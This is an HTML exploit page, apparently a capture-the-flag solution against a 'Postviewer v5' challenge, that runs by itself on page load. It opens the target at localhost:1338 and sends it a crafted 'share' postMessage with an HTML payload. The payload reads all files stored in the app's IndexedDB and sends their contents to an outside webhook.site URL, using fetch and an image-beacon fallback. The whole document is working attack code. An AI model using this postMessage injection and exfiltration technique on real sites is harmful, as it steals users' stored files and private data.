<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <title>Postviewer v5 exploit</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
  </head>
  <body>
    <h2>Launching exploit…</h2>
    <p>
      This page will automatically attempt to retrieve the admin’s flag from the
      Postviewer v5 instance.
    </p>
    <script>
      (async function () {
        const EXFIL_URL =
          "https://webhook.site/90a00c64-2bf3-4683-ab13-2e3070d96349";
        const innerPayload = `<!doctype html><html><body><script>\n(async function() {\n  try {\n    const EXFIL='${EXFIL_URL}';\n    const openReq = indexedDB.open('Files', 1);\n    const db = await new Promise(resolve => { openReq.onsuccess = () => resolve(openReq.result); });\n    const tx = db.transaction('files', 'readonly').objectStore('files').getAll();\n    const records = await new Promise(resolve => { tx.onsuccess = () => resolve(tx.result); });\n    for (const rec of records) {\n      const file = rec.file;\n      const reader = new FileReader();\n      reader.onload = function() {\n       \n        try {\n          fetch(EXFIL, {method:'POST', mode:'no-cors', headers:{'Content-Type':'text/plain'}, body: reader.result});\n        } catch (e) {\n         \n          const i = new Image();\n          i.src = EXFIL + '/?data=' + encodeURIComponent(reader.result.substring(0,1024));\n        }\n      };\n      reader.readAsText(file);\n    }\n  } catch (err) {\n    console.error('exfiltration failed', err);\n  }\n})();\n<\/script></body></html>`;

        const payloadBlob = new Blob([innerPayload], { type: "text/html" });

        const exploitFile = {
          blob: payloadBlob,
          name: "exploit.html",
          cached: false,
        };
        const targetWindow = window.open("http://localhost:1338/", "_blank");

        await new Promise((res) => setTimeout(res, 4000));

        targetWindow.postMessage({ type: "share", files: [exploitFile] }, "*");
      })();
    </script>
  </body>
</html>
